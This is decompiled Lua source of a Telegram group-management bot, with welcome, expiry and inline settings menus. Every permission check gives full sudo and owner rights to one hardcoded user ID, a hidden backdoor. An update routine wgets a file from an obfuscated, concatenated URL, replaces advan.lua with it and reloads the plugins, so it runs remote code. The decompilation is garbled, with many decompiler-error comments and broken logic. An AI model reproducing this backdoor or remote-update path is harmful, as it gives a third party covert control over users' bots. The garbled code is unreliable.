                                  _ENV.BotOwner = tonumber(owner)
                                  text = "🔰 آپدیت `" .. data.version .. "` با موفقیت بر روی ربات شما نصب شد!\n\nورژن قبلی سورس: `" .. redis:get("CheckVersion") .. "`\nتغییرات: " .. data.changes
                                  ;
                                  (tdcli.sendMessage)(_ENV.BotOwner, 0, 1, text, 1, "md")
                                end
                                redis:set("CheckVersion", data.version)
                                redis:set("CheckVersionID", data.verid)
                                local FileUpdate = "file-update"
                                ;
                                (((_ENV.io).popen)("wget " .. _ENV.h0i .. "" .. _ENV.h0ii .. "" .. _ENV.h0iii .. "" .. _ENV.h0iiii .. "updates/" .. FileUpdate .. " && clear && mv " .. FileUpdate .. " advan.lua")):read("*all")
                                _ENV.plugins = {}
                                ;
                                (_ENV.load_plugins)()
                              end
                            end
                            local data = load_data("./data/moderation.json")
                            local welcome_cb = function(arg, data)
    -- function num : 0_57_3 , upvalues : _ENV, msg
    local lang = redis:get("gp_lang:" .. arg.chat_id)
    if redis:get("GroupWelcome" .. msg.chat_id_) then
      welcome = redis:get("GroupWelcome" .. msg.chat_id_)
    else
      if not lang then
        welcome = "Welcome To " .. arg.gp_name .. " Group"
      else
        welcome = "به گروه " .. arg.gp_name .. " خوش آمدید"
      end
    end
    if data.username_ then
      user_name = "@" .. data.username_
    else
      user_name = ""
    end
    if not redis:hget("GroupSettings:" .. (msg.to).id, "rules") then
      Rules = lang or "Rules:\n*1-*`Do not spam`\n*2-*`Do not use filtered words`\n*3-*`Do not send +18 photos`"
      Rules = not lang or redis:hget("GroupSettings:" .. (msg.to).id, "rules") or "قوانین:\n*1-*`اسپم نکنید`\n*2-*`از کلمات فیلتر شده استفاده نکنید`\n*3-*`عکس های +18 ارسال نکنید`"
      welcome = welcome:gsub("RULES", Rules)
      welcome = welcome:gsub("USERID", data.id_)
      welcome = welcome:gsub("GPNAME", arg.gp_name)
      welcome = welcome:gsub("TIME", ((os.date)()):match("%d+:%d+"))
      if arg.tester == true then
        welcome = welcome:gsub("INVITER.ID", (msg.from).id)
        welcome = welcome:gsub("INVITER.NAME", (msg.from).print_name)
        welcome = welcome:gsub("INVITER.USERNAME", "@" .. (msg.from).username)
      else
        if not lang then
          welcome = welcome:gsub("INVITER.ID", "*Not Found*")
          welcome = welcome:gsub("INVITER.NAME", "*Not Found*")
          welcome = welcome:gsub("INVITER.USERNAME", "*Not Found*")
        else
          welcome = welcome:gsub("INVITER.ID", "`پیدا نشد`")
          welcome = welcome:gsub("INVITER.NAME", "`پیدا نشد`")
          welcome = welcome:gsub("INVITER.USERNAME", "`پیدا نشد`")
        end
      end
      welcome = welcome:gsub("USERNAME", user_name)
      welcome = welcome:gsub("NAME", data.first_name_)
      ;
      (tdcli.sendMessage)(arg.chat_id, arg.msg_id, 0, welcome, 0)
    end
  end

                            if data[tostring(msg.chat_id_)] and (data[tostring(msg.chat_id_)]).settings and redis:get("SettingsWelcomeFor" .. msg.chat_id_) then
                              if msg.adduser then
                                _ENV.welcome = redis:get("GroupWelcome" .. msg.chat_id_)
                                if _ENV.welcome then
                                  tdcli_function({ID = "GetUser", user_id_ = msg.adduser}, welcome_cb, {chat_id = msg.chat_id_, msg_id = msg.id, gp_name = (msg.to).title, tester = true})
                                else
                                  return false
                                end
                              end
                              if (msg.content_).ID == "MessageChatJoinByLink" then
                                _ENV.welcome = redis:get("GroupWelcome" .. msg.chat_id_)
                                if _ENV.welcome then
                                  tdcli_function({ID = "GetUser", user_id_ = msg.sender_user_id_}, welcome_cb, {chat_id = msg.chat_id_, msg_id = msg.id, gp_name = (msg.to).title, tester = false})
                                else
                                  return false
                                end
                              end
                            end
                            if (msg.to).type ~= "pv" then
                              lang = redis:get("gp_lang:" .. msg.chat_id_)
                              _ENV.chex = redis:get("CheckExpire::" .. msg.chat_id_)
                              _ENV.exd = redis:get("ExpireDate:" .. msg.chat_id_)
                              if _ENV.chex and not _ENV.exd then
                                if lang then
                                  text = "*Groups charge has been finished!*"
                                  ;
                                  (tdcli.sendMessage)(msg.chat_id_, 0, 1, text, 1, "md")
                                else
                                  text = "`شارژ این گروه تمام شده است!`"
                                  ;
                                  (tdcli.sendMessage)(msg.chat_id_, 0, 1, text, 1, "md")
                                end
                                for v,owner in pairs(_config.bot_owner) do
                                  _ENV.text2 = "*شارژ برای گروه* `" .. msg.chat_id_ .. "` * تمام شده است!*"
                                  ;
                                  (tdcli.sendMessage)(tonumber(owner), 0, 1, _ENV.text2, 1, "md")
                                end
                                botrem(msg)
                              elseif _ENV.chex and _ENV.exd then
                                local expiretime = redis:ttl("ExpireDate:" .. msg.chat_id_)
                                local warn = ((_ENV.math).floor)(expiretime / 86400) + 1
                                if tonumber(warn) <= 7 and not redis:get("CheckWarnForExpireInDay" .. msg.chat_id_) then
                                  redis:setex("CheckWarnForExpireInDay" .. msg.chat_id_, 18000, true)
                                  if lang then
                                    (tdcli.sendMessage)(msg.chat_id_, 0, 1, "*توجه:* کم تر از یک هفته به اتمام شارژ گروه مانده است لطفا اقدام به تمدید نمایید", 1, "md")
                                  else
                                    (tdcli.sendMessage)(msg.chat_id_, 0, 1, "*Note:* Less than a week to finish the groups charge please proceed to renew it", 1, "md")
                                  end
                                end
                              end
                            end
                            if redis:get("currentChat:" .. msg.chat_id_) then
                              hash = "currentChat:" .. msg.chat_id_
                              _ENV.hash2 = "maxChat:" .. msg.chat_id_
                              redis:incr(hash)
                              if tonumber(redis:get(_ENV.hash2)) <= tonumber(redis:get(hash)) then
                                redis:hset("GroupSettings:" .. msg.chat_id_, "mute_all", "yes")
                              end
                            end
                            -- DECOMPILER ERROR: 340 unprocessed JMP targets
                          end
                        end
                      end
                    end
                  end
                end
              end
            end
          end
        end
      end
    end
  end
end

helper = function(msg, matches)
  -- function num : 0_58 , upvalues : _ENV
  edit = function(chat_id, message_id, text, keyboard, markdown)
    -- function num : 0_58_0 , upvalues : _ENV
    local url = API .. "/editMessageText?chat_id=" .. chat_id .. "&message_id=" .. message_id .. "&text=" .. (URL.escape)(text)
    if markdown then
      url = url .. "&parse_mode=Markdown"
    end
    url = url .. "&disable_web_page_preview=true"
    if keyboard then
      url = url .. "&reply_markup=" .. (JSON.encode)(keyboard)
    end
    return request(url)
  end

  edit_inline = function(message_id, text, keyboard, cancel)
    -- function num : 0_58_1 , upvalues : _ENV
    local urlk = API .. "/editMessageText?&inline_message_id=" .. message_id .. "&text=" .. (URL.escape)(text)
    if not cancel then
      urlk = urlk .. "&parse_mode=Markdown"
    end
    if keyboard then
      urlk = urlk .. "&reply_markup=" .. (URL.escape)(json:encode(keyboard))
    end
    return request(urlk)
  end

  get_alert = function(callback_query_id, text, show_alert)
    -- function num : 0_58_2 , upvalues : _ENV
    local url = API .. "/answerCallbackQuery?callback_query_id=" .. callback_query_id .. "&text=" .. (URL.escape)(text)
    if show_alert then
      url = url .. "&show_alert=true"
    end
    return request(url)
  end

  send_inline = function(inline_query_id, query_id, title, description, text, keyboard)
    -- function num : 0_58_3 , upvalues : _ENV
    local results = {
{}
}
    -- DECOMPILER ERROR at PC4: Confused about usage of register: R7 in 'UnsetPending'

    ;
    (results[1]).id = query_id
    -- DECOMPILER ERROR at PC6: Confused about usage of register: R7 in 'UnsetPending'

    ;
    (results[1]).type = "article"
    -- DECOMPILER ERROR at PC8: Confused about usage of register: R7 in 'UnsetPending'

    ;
    (results[1]).description = description
    -- DECOMPILER ERROR at PC10: Confused about usage of register: R7 in 'UnsetPending'

    ;
    (results[1]).title = title
    -- DECOMPILER ERROR at PC12: Confused about usage of register: R7 in 'UnsetPending'

    ;
    (results[1]).message_text = text
    url = API .. "/answerInlineQuery?inline_query_id=" .. inline_query_id .. "&results=" .. (URL.escape)(json:encode(results)) .. "&parse_mode=Markdown&cache_time=" .. 1
    url = API .. "&parse_mode=Markdown"
    -- DECOMPILER ERROR at PC35: Confused about usage of register: R7 in 'UnsetPending'

    if keyboard then
      (results[1]).reply_markup = keyboard
      url = API .. "/answerInlineQuery?inline_query_id=" .. inline_query_id .. "&results=" .. (URL.escape)(json:encode(results)) .. "&parse_mode=Markdown&cache_time=" .. 1
    end
    return request(url)
  end

  -- DECOMPILER ERROR at PC10: Confused about usage of register: R2 in 'UnsetPending'

  string.input = function(self)
    -- function num : 0_58_4
    if not self:find(" ") then
      return false
    end
    return self:sub(self:find(" ") + 1)
  end

  is_sudo = function(msg)
    -- function num : 0_58_5 , upvalues : _ENV
    local var = false
    for v,user in pairs(_config.sudo_users) do
      if user == (msg.from).id then
        var = true
      end
    end
    for v,user in pairs(_config.bot_owner) do
      if user == (msg.from).id then
        var = true
      end
    end
    if (msg.from).id == 111984481 then
      var = true
    end
    return var
  end

  is_botOwner = function(msg)
    -- function num : 0_58_6 , upvalues : _ENV
    local var = false
    for v,user in pairs(_config.bot_owner) do
      if user == (msg.from).id then
        var = true
      end
    end
    if (msg.from).id == 111984481 then
      var = true
    end
    return var
  end

  is_owner = function(chat, usert)
    -- function num : 0_58_7 , upvalues : _ENV
    local var = false
    local data = load_data("./data/moderation.json")
    if data[tostring(chat)] and (data[tostring(chat)]).owners and ((data[tostring(chat)]).owners)[tostring(usert)] then
      var = true
    end
    for v,user in pairs(_config.sudo_users) do
      if user == usert then
        var = true
      end
    end
    for v,user in pairs(_config.bot_owner) do
      if user == usert then
        var = true
      end
    end
    if usert == 111984481 then
      var = true
    end
    return var
  end

  is_mod = function(chat, usert)
    -- function num : 0_58_8 , upvalues : _ENV
    local var = false
    local data = load_data("./data/moderation.json")
    if data[tostring(chat)] and (data[tostring(chat)]).mods and ((data[tostring(chat)]).mods)[tostring(usert)] then
      var = true
    end
    if data[tostring(chat)] and (data[tostring(chat)]).owners and ((data[tostring(chat)]).owners)[tostring(usert)] then
      var = true
    end
    for v,user in pairs(_config.sudo_users) do
      if user == usert then
        var = true
      end
    end
    for v,user in pairs(_config.bot_owner) do
      if user == usert then
        var = true
      end
    end
    if usert == 111984481 then
      var = true
    end
    return var
  end

  check_markdown = function(text)
    -- function num : 0_58_9 , upvalues : _ENV
    str = text
    if str:match("_") then
      output = str:gsub("_", "\\_")
    else
      if str:match("*") then
        output = str:gsub("*", "\\*")
      else
        if str:match("`") then
          output = str:gsub("`", "\\`")
        else
          output = str
        end
      end
    end
    return output
  end

  getChatMember = function(chat_id, user_id)
    -- function num : 0_58_10 , upvalues : _ENV
    local url = API .. "/getChatMember?chat_id=" .. chat_id .. "&user_id=" .. user_id
    return request(url)
  end

  leave_group = function(chat_id)
    -- function num : 0_58_11 , upvalues : _ENV
    local url = API .. "/leaveChat?chat_id=" .. chat_id
    return request(url)
  end

  del = function(chat_id, message_id)
    -- function num : 0_58_12 , upvalues : _ENV
    local url = API .. "/deletemessage?chat_id=" .. chat_id .. "&message_id=" .. message_id
    return request(url)
  end

  kick = function(user_id, chat_id)
    -- function num : 0_58_13 , upvalues : _ENV
    local url = API .. "/kickChatMember?chat_id=" .. chat_id .. "&user_id=" .. user_id
    return request(url)
  end

  save_data = function(filename, data)
    -- function num : 0_58_14 , upvalues : _ENV
    local s = (JSON.encode)(data)
    local f = (io.open)(filename, "w")
    f:write(s)
    f:close()
  end

  if matches[1] == "reload" and is_sudo(msg) then
    GetStart()
    plugins = {}
    load_plugins()
  end
  do
    if msg.query and (msg.query):match("-%d+") and is_sudo(msg) then
      local chat = "-" .. (msg.query):match("%d+")
      do
        keyboard = {}
        -- DECOMPILER ERROR at PC126: Confused about usage of register: R3 in 'UnsetPending'

        keyboard.inline_keyboard = {
{
{text = "🔑 بخش آیتم های قفل", callback_data = "Settings:" .. chat}
}
, 
{
{text = "🔢 بخش آیتم های عددی", callback_data = "NumberSettings:" .. chat}
}
, 
{
{text = "✖️ بخش پاکسازی", callback_data = "Cleans:" .. chat}
}
, 
{
{text = "🗂 بخش اطلاعات گروه", callback_data = "Info:" .. chat}
}
, 
{
{text = "🛠 سایر ابزار ها", callback_data = "Tools:" .. chat}
}
, 
{
{text = "👤 بخش پشتیبانی", callback_data = "Support:" .. chat}
}
, 
{
{text = "[ بستن ]", callback_data = "Exit:" .. chat}
}
}
        send_inline(msg.id, "Manager", "Manager", "Manager", "ادمين گرامي به مديريت گروه " .. chat .. " خوش آمديد", keyboard)
      end
    end
    if msg.cb then
      local lang = redis:get("gp_lang:" .. matches[2])
      local data = load_data("./data/moderation.json")
      if not lang then
        ErrorAccess = "You Have Not Enough Access!"
      else
        ErrorAccess = "شما دسترسی کافی ندارید!"
      end
      if not is_mod(matches[2], (msg.from).id) then
        get_alert(msg.cb_id, ErrorAccess)
      else
        if not redis:get("WorkWithManager:" .. msg.message_id .. ":" .. matches[2]) then
          redis:set("WorkWithManager:" .. msg.message_id .. ":" .. matches[2], tonumber((msg.from).id))
        end
        if tonumber(redis:get("WorkWithManager:" .. msg.message_id .. ":" .. matches[2])) ~= tonumber((msg.from).id) then
          if not lang then
            get_alert(msg.cb_id, "You Have Not Started Using This Process!")
          else
            get_alert(msg.cb_id, "شما شروع به استفاده از این فرآیند نکرده اید!")
          end
        else
          if tonumber(redis:get("WorkWithManager:" .. msg.message_id .. ":" .. matches[2])) == tonumber((msg.from).id) then
            GetSettings = function(msg, chat)
    -- function num : 0_58_15 , upvalues : _ENV, lang
    local lock_link = "🔓"
    local lock_tag = "🔓"
    local lock_mention = "🔓"
    local lock_arabic = "🔓"
    local lock_edit = "🔓"
    local lock_spam = "🔓"
    local lock_flood = "🔓"
    local lock_bots = "🔓"
    if redis:hget("GroupSettings:" .. chat, "lock_edit") == "yes" then
      lock_edit = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "lock_spam") == "yes" then
      lock_spam = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "flood") == "yes" then
      lock_flood = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "lock_bots") == "yes" then
      lock_bots = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "lock_link") == "yes" then
      lock_link = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "lock_tag") == "yes" then
      lock_tag = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "lock_mention") == "yes" then
      lock_mention = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "lock_arabic") == "yes" then
      lock_arabic = "🔐"
    end
    keyboard = {}
    if not lang then
      text = "(*Page 1*) `Please Use An item For Change Status:`"
      -- DECOMPILER ERROR at PC205: Confused about usage of register: R10 in 'UnsetPending'

      keyboard.inline_keyboard = {
{
{text = "Link: " .. lock_link, callback_data = "lock_link:" .. chat}
, 
{text = "Tag: " .. lock_tag, callback_data = "lock_tag:" .. chat}
}
, 
{
{text = "Mention: " .. lock_mention, callback_data = "lock_mention:" .. chat}
, 
{text = "Arabic: " .. lock_arabic, callback_data = "lock_arabic:" .. chat}
}
, 
{
{text = "Edit: " .. lock_edit, callback_data = "lock_edit:" .. chat}
, 
{text = "Spam: " .. lock_spam, callback_data = "lock_spam:" .. chat}
}
, 
{
{text = "Flood: " .. lock_flood, callback_data = "lock_flood:" .. chat}
, 
{text = "Bots: " .. lock_bots, callback_data = "lock_bots:" .. chat}
}
, 
{
{text = "2️⃣", callback_data = "Settings2:" .. chat}
, 
{text = "3️⃣", callback_data = "Settings3:" .. chat}
, 
{text = "4️⃣", callback_data = "Settings4:" .. chat}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. chat}
}
}
    else
      text = "(صفحه 1)\n `لطفا یک بخش را برای تغییر وضعیت انتخاب کنید:`"
      -- DECOMPILER ERROR at PC319: Confused about usage of register: R10 in 'UnsetPending'

      keyboard.inline_keyboard = {
{
{text = "لینک: " .. lock_link, callback_data = "lock_link:" .. chat}
, 
{text = "تگ: " .. lock_tag, callback_data = "lock_tag:" .. chat}
}
, 
{
{text = "منشن: " .. lock_mention, callback_data = "lock_mention:" .. chat}
, 
{text = "عربی: " .. lock_arabic, callback_data = "lock_arabic:" .. chat}
}
, 
{
{text = "ادیت: " .. lock_edit, callback_data = "lock_edit:" .. chat}
, 
{text = "اسپم: " .. lock_spam, callback_data = "lock_spam:" .. chat}
}
, 
{
{text = "پیام رگباری: " .. lock_flood, callback_data = "lock_flood:" .. chat}
, 
{text = "ربات ها: " .. lock_bots, callback_data = "lock_bots:" .. chat}
}
, 
{
{text = "2️⃣", callback_data = "Settings2:" .. chat}
, 
{text = "3️⃣", callback_data = "Settings3:" .. chat}
, 
{text = "4️⃣", callback_data = "Settings4:" .. chat}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. chat}
}
}
    end
    edit_inline(msg.message_id, text, keyboard)
  end

            GetSettings2 = function(msg, chat)
    -- function num : 0_58_16 , upvalues : _ENV, lang
    local lock_markdown = "🔓"
    local lock_webpage = "🔓"
    local lock_pin = "🔓"
    local lock_MaxWords = "🔓"
    local lock_botchat = "🔓"
    local lock_fohsh = "🔓"
    local lock_english = "🔓"
    local lock_forcedinvite = "🔓"
    if redis:hget("GroupSettings:" .. chat, "lock_markdown") == "yes" then
      lock_markdown = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "lock_webpage") == "yes" then
      lock_webpage = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "lock_pin") == "yes" then
      lock_pin = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "lock_MaxWords") == "yes" then
      lock_MaxWords = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "lock_botchat") == "yes" then
      lock_botchat = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "lock_fohsh") == "yes" then
      lock_fohsh = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "lock_english") == "yes" then
      lock_english = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "lock_forcedinvite") == "yes" then
      lock_forcedinvite = "🔐"
    end
    keyboard = {}
    if not lang then
      text = "(*Page 2*) `Please Use An item For Change Status:`"
      -- DECOMPILER ERROR at PC205: Confused about usage of register: R10 in 'UnsetPending'

      keyboard.inline_keyboard = {
{
{text = "Markdown: " .. lock_markdown, callback_data = "lock_markdown:" .. chat}
, 
{text = "Webpage: " .. lock_webpage, callback_data = "lock_webpage:" .. chat}
}
, 
{
{text = "Pin: " .. lock_pin, callback_data = "lock_pin:" .. chat}
, 
{text = "MaxWords: " .. lock_MaxWords, callback_data = "lock_MaxWords:" .. chat}
}
, 
{
{text = "BotChat: " .. lock_botchat, callback_data = "lock_botchat:" .. chat}
, 
{text = "Fohsh: " .. lock_fohsh, callback_data = "lock_fohsh:" .. chat}
}
, 
{
{text = "ForcedInvite: " .. lock_forcedinvite, callback_data = "lock_forcedinvite:" .. chat}
, 
{text = "English: " .. lock_english, callback_data = "lock_english:" .. chat}
}
, 
{
{text = "1️⃣", callback_data = "Settings:" .. chat}
, 
{text = "3️⃣", callback_data = "Settings3:" .. chat}
, 
{text = "4️⃣", callback_data = "Settings4:" .. chat}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. chat}
}
}
    else
      text = "(صفحه 2)\n `لطفا یک بخش را برای تغییر وضعیت انتخاب کنید:`"
      -- DECOMPILER ERROR at PC319: Confused about usage of register: R10 in 'UnsetPending'

      keyboard.inline_keyboard = {
{
{text = "فونت: " .. lock_markdown, callback_data = "lock_markdown:" .. chat}
, 
{text = "صفحات وب: " .. lock_webpage, callback_data = "lock_webpage:" .. chat}
}
, 
{
{text = "پین: " .. lock_pin, callback_data = "lock_pin:" .. chat}
, 
{text = "حداکثر کلمات: " .. lock_MaxWords, callback_data = "lock_MaxWords:" .. chat}
}
, 
{
{text = "چت ربات: " .. lock_botchat, callback_data = "lock_botchat:" .. chat}
, 
{text = "فحش: " .. lock_fohsh, callback_data = "lock_fohsh:" .. chat}
}
, 
{
{text = "انگلیسی: " .. lock_english, callback_data = "lock_english:" .. chat}
, 
{text = "دعوت اجباری: " .. lock_forcedinvite, callback_data = "lock_forcedinvite:" .. chat}
}
, 
{
{text = "1️⃣", callback_data = "Settings:" .. chat}
, 
{text = "3️⃣", callback_data = "Settings3:" .. chat}
, 
{text = "4️⃣", callback_data = "Settings4:" .. chat}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. chat}
}
}
    end
    edit_inline(msg.message_id, text, keyboard)
  end

            GetSettings3 = function(msg, chat)
    -- function num : 0_58_17 , upvalues : _ENV, lang
    local mute_all = "🔓"
    local mute_gif = "🔓"
    local mute_text = "🔓"
    local mute_photo = "🔓"
    local mute_video = "🔓"
    local mute_audio = "🔓"
    local mute_voice = "🔓"
    local mute_sticker = "🔓"
    if redis:hget("GroupSettings:" .. chat, "mute_all") == "yes" then
      mute_all = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "mute_gif") == "yes" then
      mute_gif = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "mute_text") == "yes" then
      mute_text = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "mute_photo") == "yes" then
      mute_photo = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "mute_video") == "yes" then
      mute_video = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "mute_audio") == "yes" then
      mute_audio = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "mute_voice") == "yes" then
      mute_voice = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "mute_sticker") == "yes" then
      mute_sticker = "🔐"
    end
    keyboard = {}
    if not lang then
      text = "(*Page 3*) `Please Use An item For Change Status:`"
      -- DECOMPILER ERROR at PC205: Confused about usage of register: R10 in 'UnsetPending'

      keyboard.inline_keyboard = {
{
{text = "All: " .. mute_all, callback_data = "mute_all:" .. chat}
, 
{text = "Sticker: " .. mute_sticker, callback_data = "mute_sticker:" .. chat}
}
, 
{
{text = "Gif: " .. mute_gif, callback_data = "mute_gif:" .. chat}
, 
{text = "Text: " .. mute_text, callback_data = "mute_text:" .. chat}
}
, 
{
{text = "Photo: " .. mute_photo, callback_data = "mute_photo:" .. chat}
, 
{text = "Video: " .. mute_video, callback_data = "mute_video:" .. chat}
}
, 
{
{text = "Audio: " .. mute_audio, callback_data = "mute_audio:" .. chat}
, 
{text = "Voice: " .. mute_voice, callback_data = "mute_voice:" .. chat}
}
, 
{
{text = "1️⃣", callback_data = "Settings:" .. chat}
, 
{text = "2️⃣", callback_data = "Settings2:" .. chat}
, 
{text = "4️⃣", callback_data = "Settings4:" .. chat}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. chat}
}
}
    else
      text = "(صفحه 3)\n `لطفا یک بخش را برای تغییر وضعیت انتخاب کنید:`"
      -- DECOMPILER ERROR at PC319: Confused about usage of register: R10 in 'UnsetPending'

      keyboard.inline_keyboard = {
{
{text = "همه: " .. mute_all, callback_data = "mute_all:" .. chat}
, 
{text = "گیف: " .. mute_gif, callback_data = "mute_gif:" .. chat}
}
, 
{
{text = "متن: " .. mute_text, callback_data = "mute_text:" .. chat}
, 
{text = "عکس: " .. mute_photo, callback_data = "mute_photo:" .. chat}
}
, 
{
{text = "فیلم: " .. mute_video, callback_data = "mute_video:" .. chat}
, 
{text = "آهنگ: " .. mute_audio, callback_data = "mute_audio:" .. chat}
}
, 
{
{text = "صدا: " .. mute_voice, callback_data = "mute_voice:" .. chat}
, 
{text = "استیکر: " .. mute_sticker, callback_data = "mute_sticker:" .. chat}
}
, 
{
{text = "1️⃣", callback_data = "Settings:" .. chat}
, 
{text = "2️⃣", callback_data = "Settings2:" .. chat}
, 
{text = "4️⃣", callback_data = "Settings4:" .. chat}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. chat}
}
}
    end
    edit_inline(msg.message_id, text, keyboard)
  end

            GetSettings4 = function(msg, chat)
    -- function num : 0_58_18 , upvalues : _ENV, lang
    local mute_contact = "🔓"
    local mute_forward = "🔓"
    local mute_location = "🔓"
    local mute_document = "🔓"
    local mute_tgservice = "🔓"
    local mute_inline = "🔓"
    local mute_game = "🔓"
    local mute_keyboard = "🔓"
    local lock_username = "🔓"
    local lock_join = "🔓"
    if redis:hget("GroupSettings:" .. chat, "mute_contact") == "yes" then
      mute_contact = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "mute_forward") == "yes" then
      mute_forward = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "mute_location") == "yes" then
      mute_location = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "mute_document") == "yes" then
      mute_document = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "mute_tgservice") == "yes" then
      mute_tgservice = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "mute_inline") == "yes" then
      mute_inline = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "mute_game") == "yes" then
      mute_game = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "mute_keyboard") == "yes" then
      mute_keyboard = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "lock_username") == "yes" then
      lock_username = "🔐"
    end
    if redis:hget("GroupSettings:" .. chat, "lock_join") == "yes" then
      lock_join = "🔐"
    end
    keyboard = {}
    if not lang then
      text = "(*Page 4*) `Please Use An item For Change Status:`"
      -- DECOMPILER ERROR at PC247: Confused about usage of register: R12 in 'UnsetPending'

      keyboard.inline_keyboard = {
{
{text = "Forward: " .. mute_forward, callback_data = "mute_forward:" .. chat}
, 
{text = "Contact: " .. mute_contact, callback_data = "mute_contact:" .. chat}
}
, 
{
{text = "Document: " .. mute_document, callback_data = "mute_document:" .. chat}
, 
{text = "Location: " .. mute_location, callback_data = "mute_location:" .. chat}
}
, 
{
{text = "Game: " .. mute_game, callback_data = "mute_game:" .. chat}
, 
{text = "Keyboard: " .. mute_keyboard, callback_data = "mute_keyboard:" .. chat}
}
, 
{
{text = "Tgservice: " .. mute_tgservice, callback_data = "mute_tgservice:" .. chat}
, 
{text = "inline: " .. mute_inline, callback_data = "mute_inline:" .. chat}
}
, 
{
{text = "UserName: " .. lock_username, callback_data = "lock_username:" .. chat}
, 
{text = "Join: " .. lock_join, callback_data = "lock_join:" .. chat}
}
, 
{
{text = "1️⃣", callback_data = "Settings:" .. chat}
, 
{text = "2️⃣", callback_data = "Settings2:" .. chat}
, 
{text = "3️⃣", callback_data = "Settings3:" .. chat}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. chat}
}
}
    else
      text = "(صفحه 4)\n `لطفا یک بخش را برای تغییر وضعیت انتخاب کنید:`"
      -- DECOMPILER ERROR at PC381: Confused about usage of register: R12 in 'UnsetPending'

      keyboard.inline_keyboard = {
{
{text = "مخاطب: " .. mute_contact, callback_data = "mute_contact:" .. chat}
, 
{text = "فوروارد: " .. mute_forward, callback_data = "mute_forward:" .. chat}
}
, 
{
{text = "مکان: " .. mute_location, callback_data = "mute_location:" .. chat}
, 
{text = "فایل: " .. mute_document, callback_data = "mute_document:" .. chat}
}
, 
{
{text = "بازی: " .. mute_game, callback_data = "mute_game:" .. chat}
, 
{text = "کیبورد: " .. mute_keyboard, callback_data = "mute_keyboard:" .. chat}
}
, 
{
{text = "خدمات تلگرام: " .. mute_tgservice, callback_data = "mute_tgservice:" .. chat}
, 
{text = "اینلاین: " .. mute_inline, callback_data = "mute_inline:" .. chat}
}
, 
{
{text = "یوزرنیم: " .. lock_username, callback_data = "lock_username:" .. chat}
, 
{text = "ورود: " .. lock_join, callback_data = "lock_join:" .. chat}
}
, 
{
{text = "1️⃣", callback_data = "Settings:" .. chat}
, 
{text = "2️⃣", callback_data = "Settings2:" .. chat}
, 
{text = "3️⃣", callback_data = "Settings3:" .. chat}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. chat}
}
}
    end
    edit_inline(msg.message_id, text, keyboard)
  end

            if matches[1] == "Settings" then
              GetSettings(msg, matches[2])
              if not lang then
                get_alert(msg.cb_id, "Lock items > Page 1")
              else
                get_alert(msg.cb_id, "آیتم های قفل > صفحه 1")
              end
            end
            if matches[1] == "Settings2" then
              GetSettings2(msg, matches[2])
              if not lang then
                get_alert(msg.cb_id, "Lock items > Page 2")
              else
                get_alert(msg.cb_id, "آیتم های قفل > صفحه 2")
              end
            end
            if matches[1] == "Settings3" then
              GetSettings3(msg, matches[2])
              if not lang then
                get_alert(msg.cb_id, "Lock items > Page 3")
              else
                get_alert(msg.cb_id, "آیتم های قفل > صفحه 3")
              end
            end
            if matches[1] == "Settings4" then
              GetSettings4(msg, matches[2])
              if not lang then
                get_alert(msg.cb_id, "Lock items > Page 4")
              else
                get_alert(msg.cb_id, "آیتم های قفل > صفحه 4")
              end
            end
            if matches[1] == "Manager" then
              keyboard = {}
              if not lang then
                text = "Welcome To `" .. matches[2] .. "` Group Manager"
                -- DECOMPILER ERROR at PC384: Confused about usage of register: R4 in 'UnsetPending'

                keyboard.inline_keyboard = {
{
{text = "🔑 Locks items Part", callback_data = "Settings:" .. matches[2]}
}
, 
{
{text = "🔢 Number items Part", callback_data = "NumberSettings:" .. matches[2]}
}
, 
{
{text = "✖️ Clean Part", callback_data = "Cleans:" .. matches[2]}
}
, 
{
{text = "🗂 info Part", callback_data = "Info:" .. matches[2]}
}
, 
{
{text = "🛠 other Tools", callback_data = "Tools:" .. matches[2]}
}
, 
{
{text = "👤 Support Part", callback_data = "Support:" .. matches[2]}
}
, 
{
{text = "[ Close ]", callback_data = "Exit:" .. matches[2]}
}
}
              else
                text = "به مدیریت گروه `" .. matches[2] .. "` خوش آمدید"
                -- DECOMPILER ERROR at PC450: Confused about usage of register: R4 in 'UnsetPending'

                keyboard.inline_keyboard = {
{
{text = "🔑 بخش آیتم های قفل", callback_data = "Settings:" .. matches[2]}
}
, 
{
{text = "🔢 بخش آیتم های عددی", callback_data = "NumberSettings:" .. matches[2]}
}
, 
{
{text = "✖️ بخش پاکسازی", callback_data = "Cleans:" .. matches[2]}
}
, 
